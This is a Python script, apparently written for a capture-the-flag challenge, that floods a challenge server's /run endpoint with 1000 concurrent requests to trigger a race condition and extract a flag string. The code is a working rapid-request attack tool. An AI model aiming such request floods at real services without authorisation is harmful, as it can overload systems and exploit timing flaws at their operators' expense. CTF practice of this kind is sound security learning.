#!/usr/bin/env python3
"""
Rapid fire requests - no delays
"""
import requests
import re
import concurrent.futures

BASE = "http://chall-35f0557e.evt-207.glabs.ctf7.com"

print("="*80)
print("RAPID FIRE ATTACK")
print("="*80)

session = requests.Session()

def send_request(i):
    try:
        r = session.post(f"{BASE}/run", json={"cmd": "help"}, timeout=10)
        d = r.json()
        out = d.get("output", "").strip()
        
        if "FLAG{" in out or "Kaal{" in out:
            return (i, out)
        return (i, None)
    except:
        return (i, None)

# Send 1000 requests rapidly using threading
print("\nSending 1000 rapid requests...")

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(send_request, i) for i in range(1000)]
    
    for future in concurrent.futures.as_completed(futures):
        i, result = future.result()
        
        if result:
            print(f"\n{'='*80}")
            print(f"✓✓✓ FOUND FLAG at request {i}!")
            print(f"{'='*80}")
            print(f"Output: {result}")
            
            flag = re.search(r'(Kaal|FLAG)\{[^}]+\}', result)
            if flag:
                print(f"\nFLAG: {flag.group(0)}")
            print('='*80)
            executor.shutdown(wait=False)
            break
        
        if i % 100 == 0:
            print(f"  Sent {i} requests...")

print("\n" + "="*80)
